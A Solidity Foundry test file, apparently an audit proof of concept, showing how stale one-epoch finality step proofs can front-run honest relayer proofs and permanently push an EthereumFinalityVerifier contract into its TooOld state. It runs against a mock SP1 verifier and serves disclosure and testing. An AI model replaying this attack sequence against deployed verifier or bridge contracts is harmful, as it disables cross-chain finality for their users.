// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {EthereumFinalityVerifier} from "../src/verifiers/EthereumFinalityVerifier.sol";
import {FinalityVerifier} from "../src/verifiers/FinalityVerifier.sol";
import {MockSP1Verifier} from "./mocks/MockSP1Verifier.sol";

/// PoC: anyone holding valid proofs of old, one-epoch steps can void every honest in-flight proof and walk the verifier
/// into TooOld, because `update` takes any finalized checkpoint past the anchor, however stale.
contract StaleStepPoC is Test {
    bytes32 constant KEY = keccak256("the P1 program");
    uint64 constant EPOCH = 479_000;
    uint256 constant GENESIS = 1_606_824_023;
    /// Honest proving latency (the prototype's target: 60 min end to end, 13 of them Ethereum's finality).
    uint256 constant L = 47 minutes;

    MockSP1Verifier sp1;
    EthereumFinalityVerifier v;

    function _anchor(uint64 e) internal pure returns (bytes32) {
        return keccak256(abi.encode("anchor", e));
    }

    function _start(uint64 e) internal pure returns (uint256) {
        return GENESIS + uint256(e) * 384;
    }

    function _values(uint64 from, uint64 to) internal pure returns (bytes memory) {
        return abi.encode(_anchor(from), _anchor(to), to, keccak256(abi.encode("headers", from, to)), uint64(from), uint64(to));
    }

    function test_poc_staleOneEpochStepsKillTheVerifier() public {
        sp1 = new MockSP1Verifier();
        v = new EthereumFinalityVerifier(sp1, KEY, _anchor(EPOCH), EPOCH, GENESIS);
        // The honest relayer starts proving as soon as the anchor's successor is finalized (~2 epochs) and lands L later.
        uint256 t = _start(EPOCH) + 13 minutes;
        uint64 held = EPOCH;
        uint256 rounds = 0;
        while (true) {
            t += L;
            vm.warp(t);
            // The honest proof: from the held anchor to the latest finalized checkpoint (two epochs behind now).
            uint64 latest = uint64((t - GENESIS) / 384) - 2;
            bytes memory honest = _values(held, latest);
            bytes memory honestProof = sp1.prove(KEY, honest);
            if (t > v.lagEnds()) {
                vm.expectRevert(abi.encodeWithSelector(FinalityVerifier.TooOld.selector, held));
                v.update(honest, honestProof);
                break;
            }
            // The attacker lands first a valid proof of the stale one-epoch step held -> held + 1.
            bytes memory step = _values(held, held + 1);
            v.update(step, sp1.prove(KEY, step));
            rounds++;
            vm.expectRevert(abi.encodeWithSelector(FinalityVerifier.WrongAnchor.selector, _anchor(held), _anchor(held + 1)));
            v.update(honest, honestProof);
            held = held + 1;
        }
        emit log_named_uint("attacker proofs to kill the verifier", rounds);
        emit log_named_uint("hours from the anchor's epoch to death", (t - _start(EPOCH)) / 1 hours);
        // Dead for good: even the freshest checkpoint can no longer be proven from the held anchor.
        assertGt(block.timestamp, v.lagEnds());
    }
}
